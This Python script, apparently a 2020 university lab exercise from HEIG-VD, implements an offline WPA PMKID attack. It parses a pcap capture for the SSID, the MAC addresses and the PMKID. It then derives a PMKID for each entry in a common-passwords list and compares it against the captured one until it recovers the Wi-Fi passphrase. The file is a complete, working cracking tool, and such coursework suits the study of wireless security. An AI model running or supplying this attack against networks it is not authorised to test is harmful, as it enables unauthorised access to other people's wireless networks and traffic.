#!/usr/bin/env python
# -*- coding: utf-8 -*-


"""
Ce script permet de bruteforcer la passphrase à l'aide du PMKID (WPA)
"""

__author__      = "Olivier Koffi et Samuel Metler"
__copyright__   = "Copyright 2020, HEIG-VD"
__license__ 	= "GPL"
__version__ 	= "1.0"
__email__ 		= "olivier.koffi@heig-vd.ch et samuel.metler@heig-vd.ch"
__status__ 		= "Prototype"


from scapy.all import *
from binascii import a2b_hex, b2a_hex, b2a_uu
from pbkdf2 import *
from numpy import array_split
from numpy import array
import hmac, hashlib


#####################################
#                                   #
#               Utils               #
#                                   #
#####################################

"""
This function calculates the key expansion from the 256 bit PMK to the 512 bit PTK
"""
def customPRF512(key,A,B):
    blen = 64
    i    = 0
    R    = b''
    while i<=((blen*8+159)/160):
        hmacsha1 = hmac.new(key,A+str.encode(chr(0x00))+B+str.encode(chr(i)),hashlib.sha1)
        i+=1
        R = R+hmacsha1.digest()
    return R[:blen]


#####################################
#                                   #
#       WPA Params extraction       #
#                                   #
#####################################

def extract_params(wpa) :
    ssid = ap_mac = client_mac = pmkid = ""

    for pkt in wpa :

        # It means it's a beacon frame
        if pkt.haslayer(Dot11Elt) and pkt.type == 0 and pkt.subtype == 8 and ssid == "" :
            ssid = pkt.info.decode()
            ap_mac = pkt.addr2

        # It means it's a handshake frame from ap_mac
        if pkt.haslayer(EAPOL) and ssid != "" :
            # It means it's the first handshake pkt because no MIC
            if b2a_hex(pkt[EAPOL].load[78:94]).decode() == '00'*16 :  
                client_mac = pkt[Dot11].addr1
                pmkid = bytes(pkt[EAPOL].load[101:])

        if ssid and ap_mac and client_mac and pmkid :
            print ("\n\nValues retrieved from the pcap file")
            print ("============================\n")
            print ("SSID: ", ssid, "\n")
            print ("AP Mac: ", ap_mac, "\n")
            print ("Client Mac: ", client_mac, "\n")
            print ("PMKID: ", pmkid.hex())
            break
    return ssid, ap_mac, client_mac, pmkid


#####################################
#                                   #
#       Crack WPA Passphrase        #
#                                   #
#####################################

def crack(ssid, ap_mac, client_mac, pmkid) :
    passwords_file = open('./10k_most_common_passwords.txt','r')
    passwords = passwords_file.readlines()
    passphrase_ret = "Not found" 
    pmk_cst = "PMK Name".encode()

    print ("\n\nCracking WPA Passphrase")
    print ("=============================")
    for psw in passwords :
        
        # We don't take the final '\n'
        passphrase = str.encode(psw[:-1])

        # Calculate 4096 rounds to obtain the 256 bit (32 oct) PMK
        pmk_ret = pbkdf2(hashlib.sha1, passphrase, ssid.encode(), 4096, 32)

        # Format MACs in bytes
        _ap_mac = a2b_hex(ap_mac.replace(':', '').lower())
        _client_mac = a2b_hex(client_mac.replace(':', '').lower())

        # Generate PMKID
        pmkid_ret = hmac.new(pmk_ret, pmk_cst + _ap_mac + _client_mac, hashlib.sha1).hexdigest()[:32]

        print ("Passphrase : ",psw)
        print ("PMKID: ", pmkid_ret, "\n")

        # Compare PMKID
        if pmkid_ret == b2a_hex(pmkid).decode() :
            print ("\nPassphrase found !\n")
            passphrase_ret = psw
            break

    print ("\nResults")
    print ("=============================\n")
    print ("The passphrase is: ",passphrase_ret,"\n")

    passwords_file.close()


#####################################
#                                   #
#               Main                #
#                                   #
#####################################

# Read capture file in order to extract SSID, MACs and PMKID
wpa = rdpcap("PMKID_handshake.pcap") 

ssid, ap_mac, client_mac, pmkid = extract_params(wpa)

crack(ssid, ap_mac, client_mac, pmkid)
